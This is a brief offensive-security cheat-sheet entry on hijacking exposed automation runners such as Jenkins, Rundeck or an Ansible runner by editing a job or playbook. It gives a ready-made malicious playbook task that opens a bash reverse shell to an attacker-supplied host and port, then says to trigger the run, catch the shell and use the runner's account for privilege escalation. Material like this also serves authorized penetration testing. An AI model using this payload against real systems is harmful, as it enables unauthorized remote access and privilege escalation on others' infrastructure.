# Ansible Automation Runner Arbitrary Command Execution

If an exposed automation UI (OliveTin, Rundeck, Jenkins, an internal Ansible runner) lets you edit a playbook/job definition and re-run it, that's direct command execution as whatever account runs it.

```yaml
# minimal malicious playbook task
- hosts: localhost
  tasks:
    - name: pwn
      command: bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
```
Edit the existing playbook/job through the UI, trigger a run, and catch the shell — often an easy privilege jump if the runner executes as a different (more privileged) local user than your current foothold.
